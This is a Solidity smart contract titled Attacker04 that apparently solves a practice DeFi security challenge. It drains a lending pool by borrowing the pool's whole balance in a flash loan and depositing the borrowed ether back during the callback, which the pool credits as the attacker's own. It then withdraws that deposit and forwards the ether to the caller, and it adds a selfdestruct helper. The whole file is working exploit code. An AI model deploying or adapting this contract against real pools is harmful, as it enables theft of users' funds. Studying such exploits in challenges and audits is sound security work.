// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title Attacker
 * @author DB
 */

interface IInterface {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Attacker04 {
    using Address for address payable;

    address otherContract;

    constructor(address _otherContract) {
        otherContract = _otherContract;
    }

    function selfDestruct(address accountToSend) external {
        address payable account = payable(accountToSend);
        selfdestruct(account);
    }

    receive() external payable {
    }

    function callLoan() external payable {
        IInterface pool = IInterface(otherContract);
        uint256 amountToWithdraw = address(pool).balance;
        pool.flashLoan(amountToWithdraw);

        pool.withdraw();

        uint256 elBalance = address(this).balance;
        payable(msg.sender).sendValue(elBalance);
    }

    function execute() external payable {
        IInterface pool = IInterface(otherContract);

        uint256 amountToWithdraw = address(this).balance;

        pool.deposit{value: amountToWithdraw}();
    }
}
